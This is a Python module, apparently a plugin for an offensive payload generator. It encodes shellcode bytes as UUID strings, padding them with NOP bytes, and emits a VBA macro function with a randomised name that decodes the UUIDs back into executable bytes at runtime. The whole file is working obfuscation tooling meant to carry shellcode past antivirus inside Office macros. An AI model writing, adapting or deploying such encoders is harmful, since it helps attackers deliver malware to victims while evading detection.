import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        self.decodedLength = len(decoded)
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes = chunk)))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Private Function {self.name}(UUIDs)
    Dim arrayLength as Long
    Dim outArray() As Byte

    arrayLength = UBound(UUIDs) - LBound(UUIDs) + 1
    Redim outArray(arrayLength * 16)
    Dim i As Long
    For i=LBound(UUIDs) To UBound(UUIDs)
        uuidStr = Replace(UUIDs(i), "-", "")
        For j = 0 To 15
            hexPair = Mid$(uuidStr, (j * 2) + 1, 2)
            outArray(i * 16 + j) = CLng("&h" & hexPair)
        Next j
    Next i

    Redim Preserve outArray(0 To {self.decodedLength} - 1)

    {self.name} = outArray
End Function
"""
